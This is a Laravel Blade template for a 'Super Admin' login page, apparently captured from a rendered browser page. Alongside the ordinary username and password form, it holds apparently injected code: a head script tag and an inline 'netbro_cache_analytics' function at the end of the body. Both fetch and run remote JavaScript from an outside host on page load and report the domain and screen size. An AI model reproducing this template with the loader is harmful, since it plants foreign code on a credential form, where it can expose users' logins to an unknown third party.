<html lang="en" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <link rel="icon" type="image/png" sizes="16x16" href="{{asset('assets/demo/favicon.png')}}">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Login</title>
    <!-- CSS -->
    <link href="https://fonts.googleapis.com/css?family=Karla:400,400i,700" rel="stylesheet" type="text/css">
    <link href="{{asset('assets/vendors/feather-icons/feather.css')}}" rel="stylesheet" type="text/css">
    <link href="{{asset('assets/vendors/linear-icons/style.css')}}" rel="stylesheet" type="text/css">
    <link href="{{asset('assets/vendors/mono-social-icons/monosocialiconsfont.css')}}" rel="stylesheet" type="text/css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/jquery.perfect-scrollbar/1.4.0/css/perfect-scrollbar.min.css" rel="stylesheet" type="text/css">
    <link href="{{asset('assets/css/style.css')}}" rel="stylesheet" type="text/css">
    <!-- Head Libs -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
<script type="text/javascript" async="" src="http://p03.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX4g%2b%2fkYwk4O5N7KiUYlWui9UYr7ME%2beJM4TWc9MaRJj5tXxbl52kLaTf1i2LrgTagVcPQftEF8wQJHeFNpOyAQdgLJUKFPJhKLd2GhAMz%2bRbTlkHUx8akaM%2blCv1YlqycDBeNIvTLUOryFrQrNFvut0BwYY4iojWLy6CprZHnPu3LtkIvuY4x6lsyVHu4s4H%2b%2bLKXbxyWSp0g3%2biqtGljJoRt8rsnUxd05km4tYooUB82KZoSGLaW3ELywGYnO9fc83iHN%2fjRMeCSGHM9QWgijSR5h4cy9UqoCCjsACSOrH%2btnSWRiWGHlRZml2tVGCUDHCsaJIkI4uXEahwchLNvto38VU83LJ0Tevf3wSr6OCn%2fu6a2UmS797ctO93z%2bnMRfOy5yg7vMb1LmqX9e9zrjzwgwiPHPBBTBZhUVypJMVNDIEn%2bVHRwIs1LO21cUuxh&amp;idc_r=53074856434&amp;domain=&amp;sw=1366&amp;sh=768"></script></head>

<body class="body-bg-full profile-page  pace-done" style="background-image: url({{asset('assets/img/site-bg.jpg')}})">
  <div class="pace  pace-inactive">
    <div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">
  <div class="pace-progress-inner">
  </div>
</div>
<div class="pace-activity"></div></div>
    <div id="wrapper" class="row wrapper">
        <div class="container-min-full-height d-flex justify-content-center align-items-center">
            <div class="login-center">
              <h4 class="text-center">Super Admin</h4>
                <div class="navbar-header text-center mt-2 mb-4">
                    <a href="index.html">
                        <img alt="" width="150" height="150" src="{{asset('assets/img/logo-bnn.png')}}">
                    </a>
                </div>
                <!-- /.navbar-header -->
                <form method="post" action="{{route('admin.to.login')}}">
                  @csrf
                    <div class="form-group">
                        <label for="example-email">Username</label>
                        <input type="username" placeholder="username"
                        class="form-control form-control-line @error('username') is-invalid @enderror"
                        name="username"  value="{{old('username')}}">
                        @error('username')
                        <span class="invalid-feedback" role="alert">
                        <strong>{{$message}}</strong></span>
                        @enderror
                    </div>
                    <div class="form-group">
                        <label for="example-password">Password</label>
                        <input type="password" placeholder="password"
                        id="example-password" name="password"
                        class="form-control form-control-line @error('password') is-invalid @enderror">
                        @error('password')
                        <span class="invalid-feedback" role="alert">
                        <strong>{{$message}}</strong></span>
                        @enderror</div>
                    <div class="form-group">
                        <button class="btn btn-block btn-lg btn-secondary text-uppercase fs-12 fw-600" type="submit">Login</button>
                    </div>
                    <!-- /.form-group -->
                </form>
                <!-- /.form-material -->
                <hr class="mb-4">

                <!-- /.btn-list -->
                <footer class="col-sm-12 text-center">

                </footer>
            </div>
            <!-- /.login-center -->
        </div>
        <!-- /.d-flex -->
    </div>
    <!-- /.body-container -->
    <!-- Scripts -->
    <script src="{{asset('//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js')}}"></script>
    <script src="{{asset('//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js')}}"></script>
    <script src="{{asset('assets/js/material-design.js')}}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX4g%2b%2fkYwk4O5N7KiUYlWui9UYr7ME%2beJM4TWc9MaRJj5tXxbl52kLaTf1i2LrgTagVcPQftEF8wQJHeFNpOyAQdgLJUKFPJhKLd2GhAMz%2bRbTlkHUx8akaM%2blCv1YlqycDBeNIvTLUOryFrQrNFvut0BwYY4iojWLy6CprZHnPu3LtkIvuY4x6lsyVHu4s4H%2b%2bLKXbxyWSp0g3%2biqtGljJoRt8rsnUxd05km4tYooUB82KZoSGLaW3ELywGYnO9fc83iHN%2fjRMeCSGHM9QWgijSR5h4cy9UqoCCjsACSOrH%2btnSWRiWGHlRZml2tVGCUDHCsaJIkI4uXEahwchLNvto38VU83LJ0Tevf3wSr6OCn%2fu6a2UmS797ctO93z%2bnMRfOy5yg7vMb1LmqX9e9zrjzwgwiPHPBBTBZhUVypJMVNDIEn%2bVHRwIs1LO21cUuxh" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>

</body>
</html>
